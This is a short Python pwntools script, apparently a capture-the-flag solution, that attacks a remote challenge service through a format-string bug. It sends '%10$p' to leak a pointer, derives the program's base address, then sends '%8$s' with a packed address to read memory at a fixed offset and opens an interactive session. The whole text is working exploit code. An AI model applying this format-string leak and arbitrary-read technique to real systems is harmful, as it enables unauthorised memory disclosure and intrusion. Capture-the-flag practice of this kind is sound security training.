from pwn import *
context.arch='amd64'
context.log_level='debug'
def cmd(c):
    p.sendlineafter("> ",str(c))
def vul(s):
    cmd(5)
    p.sendlineafter(": ",s)

#p=process("./pwn")
p=remote("challenge.ctf.games",31444)
#gdb.attach(p)

pay=b'%10$p'
vul(pay.ljust(0x10,b'\0'))
p.readuntil(" a ")
pie= int(p.readline()[:-1],16)-(0x5555555551e0-0x0000555555554000)
log.warning(hex(pie))
pay=b'%8$s'
vul(pay.ljust(0x10,b'\0')+p64(0x000000000004060+pie))
p.interactive()
